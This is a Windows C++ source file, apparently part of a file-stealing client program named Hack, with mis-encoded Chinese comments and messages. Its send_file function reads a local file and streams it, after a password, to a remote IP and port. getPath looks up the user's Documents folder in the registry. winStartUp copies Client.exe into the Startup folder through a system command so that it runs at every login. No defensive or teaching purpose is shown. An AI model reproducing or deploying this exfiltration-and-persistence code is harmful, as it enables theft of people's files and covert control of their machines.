using namespace std;
#include "Hack.h"
#include <stdio.h>

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define  MAX_DATA_BLOCK_SIZE 8192

void send_file(const char* file_name, const char* pass, const char* ip, u_short port) {

	WSADATA wsaData;
	SOCKET s;
	FILE *fp;
	struct sockaddr_in server_addr;
	char data[MAX_DATA_BLOCK_SIZE];
	int i;
	int ret;
	fp = fopen(file_name, "rb");
	if (fp == NULL) {
		printf("�޷����ļ�\n");
		return;
	}
	WSAStartup(0x202, &wsaData);
	s = socket(AF_INET, SOCK_STREAM, 0);
	memset((void *)&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(ip);
	server_addr.sin_port = htons(port);
	if (connect(s, (struct sockaddr *)&server_addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR) {
		printf("���ӷ�����ʧ��\n");
		fclose(fp);
		closesocket(s);
		WSACleanup();
		return;
	}
	printf("������Կ������\n");
	send(s, pass, strlen(pass), 0);
	send(s, "\0", 1, 0);

	printf("�����ļ���������\n");
	send(s, file_name, strlen(file_name), 0);
	send(s, "\0", 1, 0);
	printf("�����ļ�����");
	for (;;) {
		memset((void *)data, 0, sizeof(data));
		i = fread(data, 1, sizeof(data), fp);
		if (i == 0) {
			printf("\n���ͳɹ�\n");
			break;
		}
		ret = send(s, data, i, 0);
		putchar('.');
		if (ret == SOCKET_ERROR) {
			printf("\n����ʧ�ܣ��ļ����ܲ�����\n");
			break;
		}
	}
	fclose(fp);
	closesocket(s);
	WSACleanup();
}

//ͨ��ע����ȡ���ݿ��ļ�Ŀ¼
void getPath(unsigned char *dbpath)
{
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);

	ret = RegQueryValueEx(hKey, "Personal", 0, &dwType, dbpath, &length);
	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
	}
}

//��ӿ�������
int winStartUp()
{
	unsigned char value[256] = { 0 };
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);
	ret = RegQueryValueEx(hKey, "Startup", 0, &dwType, value, &length);
	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
		return 0;
	}
	sprintf_s(cmd_command, "copy Client.exe \"%s\" /B", value);
	printf("%s\n",cmd_command);
	system(cmd_command);
	return 0;
}

